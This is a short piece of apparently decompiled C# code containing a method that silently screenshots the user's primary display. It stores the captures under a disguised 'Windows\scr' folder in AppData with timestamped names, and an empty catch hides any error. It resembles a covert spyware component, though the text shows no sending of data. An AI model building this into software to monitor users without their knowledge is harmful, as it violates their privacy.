using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Screen
{
	// Token: 0x02000005 RID: 5
	internal class ScreenShot
	{
		// Token: 0x06000007 RID: 7 RVA: 0x00002618 File Offset: 0x00000818
		public static void Screenshot()
		{
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\scr";
				Size size = Screen.PrimaryScreen.Bounds.Size;
				Bitmap bitmap = new Bitmap(size.Width, size.Height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(Point.Empty, Point.Empty, size);
				string filename = str + DateTime.Now.ToString("yyyy.MM.dd HH.mm.ss") + ".png";
				bitmap.Save(filename, ImageFormat.Jpeg);
			}
			catch
			{
			}
		}
	}
}
